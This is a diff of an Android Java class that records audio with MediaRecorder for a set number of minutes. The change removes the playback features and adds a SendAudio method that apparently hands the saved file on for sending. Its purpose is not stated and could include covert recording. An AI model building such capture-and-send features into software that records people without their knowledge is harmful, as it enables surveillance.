@@ -8,12 +8,9 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
-import android.media.MediaPlayer;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
-import android.os.Handler;
-import android.util.Log;
 
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
@@ -24,19 +21,16 @@ public final class RecordAudio {
 	private static final int RECORDING_BITRATE_OLD = 8000;
 
 	private MediaRecorder mMediaRecorder;
-	private MediaPlayer mMediaPlayer;
-	private int mPausedPosition;
 	private final String TAG = "RecordAudio";
 	ConvertDate date;
 	private static final String mPathName = "data";
 
 	// Thread pool
 	private ExecutorService mThreadPool;
-
-	private Handler mHandler;
 	int minute;
 	private AtomicBoolean mIsPlaying = new AtomicBoolean(false);
 	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
+	String outputFileName;
 
 	public RecordAudio(int minute) {
 		Logging.doLog(TAG, " RecordAudio", " RecordAudio");
@@ -46,7 +40,6 @@ public final class RecordAudio {
 
 	public void createRecord(String fileName) {
 		// reset any previous paused position
-		mPausedPosition = 0;
 		String format = "";
 		// initialise MediaRecorder
 		if (mMediaRecorder == null) {
@@ -95,7 +88,7 @@ public final class RecordAudio {
 			mMediaRecorder.reset();
 		}
 
-		mMediaRecorder.setOutputFile(fileName+format);
+		mMediaRecorder.setOutputFile(fileName + format);
 		try {
 			mMediaRecorder.prepare();
 			mMediaRecorder.start();
@@ -119,9 +112,8 @@ public final class RecordAudio {
 
 			@Override
 			public void run() {
-				String outputFileName = getOutputFileName();
+				outputFileName = getOutputFileName();
 				if (outputFileName != null) {
-					stopPlayback();
 					Logging.doLog(TAG, "record", "record");
 					mIsPlaying.set(false);
 					createRecord(outputFileName);
@@ -132,7 +124,6 @@ public final class RecordAudio {
 
 					mThreadPool.execute(new RecordingCounterUpdater());
 				}
-
 			}
 		});
 	}
@@ -166,10 +157,9 @@ public final class RecordAudio {
 		if (!filePath.exists()) {
 			filePath.mkdirs();
 		}
-		SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
-		String currentDateandTime = sdf.format(new Date());
+		date.logTime();
 
-		String file = dir + "/" + currentDateandTime;
+		String file = dir + "/" + date.logTime();
 		Logging.doLog(TAG, "file " + file, "file " + file);
 		File audioFile = new File(file);
 		try {
@@ -182,31 +172,6 @@ public final class RecordAudio {
 		}
 
 		return audioFile.getAbsolutePath();
-	}
-
-	/**
-	 * Updates the duration counter.
-	 */
-	public class PlaybackCounterUpdater extends Thread {
-
-		private long UPDATE_PERIOD = 1000;
-
-		@Override
-		public void run() {
-			try {
-				while (mIsPlaying.get()) {
-					int currentPlaybackPosition = getCurrentPlaybackPosition();
-					postCounterUpdateMessage(currentPlaybackPosition / 1000);
-					Thread.sleep(UPDATE_PERIOD);
-				}
-			} catch (InterruptedException e) {
-				Logging.doLog(TAG, "CounterUpdater Thread has ben interrupted");
-				// propagate the interrupt state
-				Thread.currentThread().interrupt();
-			}
-			mHandler.sendEmptyMessage(0);
-		}
-
 	}
 
 	/**
@@ -245,9 +210,7 @@ public final class RecordAudio {
 		}
 	}
 
-	
-
-	public void stopRecording() {
+	private void stopRecording() {
 		if (mMediaRecorder != null) {
 			Logging.doLog(TAG, "Stopping recording");
 			mMediaRecorder.stop();
@@ -255,58 +218,10 @@ public final class RecordAudio {
 			mMediaRecorder = null;
 		}
 	}
-
-	public void stopPlayback() {
-		if (mMediaPlayer != null) {
-			Logging.doLog(TAG, "Stopping playback");
-			mMediaPlayer.stop();
-			mMediaPlayer.release();
-			mMediaPlayer = null;
-		}
-	}
-
-	public void pausePlayback() {
-		if (mMediaPlayer != null) {
-			mMediaPlayer.pause();
-			mPausedPosition = mMediaPlayer.getCurrentPosition();
-		}
-
-	}
-
-	public int getPlaybackDuration() {
-		int duration = 0;
-		if (mMediaPlayer != null && mMediaPlayer.isPlaying()) {
-			duration = mMediaPlayer.getDuration();
-		}
-		return duration;
-	}
-
-	public int getCurrentPlaybackPosition() {
-		int position = 0;
-		if (mMediaPlayer != null && mMediaPlayer.isPlaying()) {
-			position = mMediaPlayer.getCurrentPosition();
-			Logging.doLog(TAG,
-					String.format("Got playback position:%d", position));
-		}
-		return position;
-	}
-
-	public void setPlayPosition(int progress) {
-		if (mMediaPlayer != null && mMediaPlayer.isPlaying()) {
-			Log.d(TAG, "progress " + progress);
-			mMediaPlayer.seekTo(progress);
-
-		}
-		mPausedPosition = progress;
-
-	}
-
-	public MediaPlayer getMediaPlayer() {
-		return mMediaPlayer;
-	}
-
-	public MediaRecorder getMediaRecorder() {
-		return mMediaRecorder;
+	
+	public void SendAudio() {
+		OperationWithAudio audio = new OperationWithAudio(this.outputFileName, this.minute);
+		
 	}
 
 	/**
@@ -333,36 +248,6 @@ public final class RecordAudio {
 			Logging.doLog(TAG, String.format(
 					"MediaRecorder error occured: %s,%d", whatDescription,
 					extra));
-		}
-
-	}
-
-	/**
-	 * Listener for the MediaPlayer error messages.
-	 */
-	public class PlayerErrorListener implements
-			android.media.MediaPlayer.OnErrorListener {
-
-		@Override
-		public boolean onError(MediaPlayer mp, int what, int extra) {
-
-			String whatDescription = "";
-
-			switch (what) {
-			case MediaPlayer.MEDIA_ERROR_UNKNOWN:
-				whatDescription = "MEDIA_ERROR_UNKNOWN";
-				break;
-			case MediaPlayer.MEDIA_ERROR_SERVER_DIED:
-				whatDescription = "MEDIA_ERROR_SERVER_DIED";
-				break;
-			default:
-				whatDescription = Integer.toString(what);
-				break;
-			}
-
-			Logging.doLog(TAG, String.format(
-					"MediaPlayer error occured: %s:%d", whatDescription, extra));
-			return false;
 		}
 
 	}
